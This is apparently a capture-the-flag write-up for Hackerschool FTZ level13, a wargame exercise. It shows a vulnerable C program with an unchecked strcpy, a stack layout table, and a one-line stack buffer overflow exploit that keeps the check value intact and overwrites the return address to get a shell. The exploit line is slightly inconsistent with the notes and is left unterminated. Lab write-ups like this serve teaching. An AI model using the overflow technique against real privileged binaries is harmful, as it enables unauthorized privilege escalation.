Hackerschool FTZ level13
===
~~~c
#include <stdlib.h>

main(int argc, char *argv[])
{
   long i=0x1234567;
   char buf[1024];

   setreuid( 3094, 3094 );
   if(argc > 1)
   strcpy(buf,argv[1]);

   if(i != 0x1234567) {
   printf(" Warnning: Buffer Overflow !!! \n");
   kill(0,11);
   }
}

~~~

~~~
RET  ebp+4   4byte
ESP  ebp     4byte //stack pointer  
dummy ebp-8 8byte
i    ebp-12  4byte //long 4byte
dummy ebp-24 12byte
buf  ebp-1048 1024byte char 1024byte
~~~

>dummy 1036byte + 0x123456 + dummy 12byte + /bin/sh

>>$ ./attackme `python -c 'print "A"*1036+"\x67\x45\x23\x01"+"A"*12+"\xa2\xf8\xff\xbf"